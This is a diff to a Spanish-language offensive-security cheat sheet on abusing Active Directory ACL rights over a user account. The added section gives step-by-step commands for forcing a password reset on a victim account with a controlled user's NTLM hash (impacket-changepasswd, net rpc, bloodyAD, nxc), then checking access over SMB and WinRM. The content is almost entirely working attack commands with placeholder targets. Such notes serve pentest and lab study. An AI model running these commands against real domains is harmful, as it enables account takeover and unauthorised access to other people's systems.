@@ -6,6 +6,7 @@ Tags: #AD #ACL #Linux #Pywhisker #Gettgtpkinit #Net
 
 Si tenemos esta ACL sobre un **User**, tenemos control total sobre el objeto y podemos, entre otras acciones, **cambiar su contraseña** o modificar sus propiedades/permisos.
 
+## Forma 1 - Con password
 ```bash 
 Paso 1:
 ❯ net rpc password 'TargetUser' 'P@$$w0rd123!' -U domain.corp/user%'passwd' -S IP_DC
@@ -41,6 +42,29 @@ Paso 2:
 
 # Verificar el ingreso por EvilWinRM
 ❯ nxc winrm IP_DC -u "TargetUser" -p 'P@$$w0rd123!'
+```
+
+## Forma 2 - Con hash 
+```bash 
+Paso 1:
+# Cambiar la password del usuario víctima 
+❯ impacket-changepasswd 'domain.corp/TargetUser@IP_DC' -altuser ControlledUser -althash HASH_NTLM -newpass 'NuevaPass123!' -reset -dc-ip IP_DC
+
+# Otra forma de hacerlo 
+❯ net rpc password 'TargetUser' 'NuevaPass123!' -U domain.corp/user%'hash' -S IP_DC
+
+❯ bloodyAD -d domain.corp -u ControlledUser -H HASH_NTLM --host IP_DC set password TargetUser 'NuevaPass123!'
+
+❯ nxc smb IP_DC -u ControlledUser -H HASH_NTLM -M change-password -o USER=TargetUser NEWPASS='NuevaPass123!'
+```
+
+```bash 
+Paso 2:
+# Verificar el cambio de password 
+❯ nxc smb IP_DC -u "TargetUser" -p 'NuevaPass123!' 
+
+# Verificar el ingreso por EvilWinRM
+❯ nxc winrm IP_DC -u "TargetUser" -p 'NuevaPass123!'
 ```
 
 ## Si la cuenta esta deshabilitada 
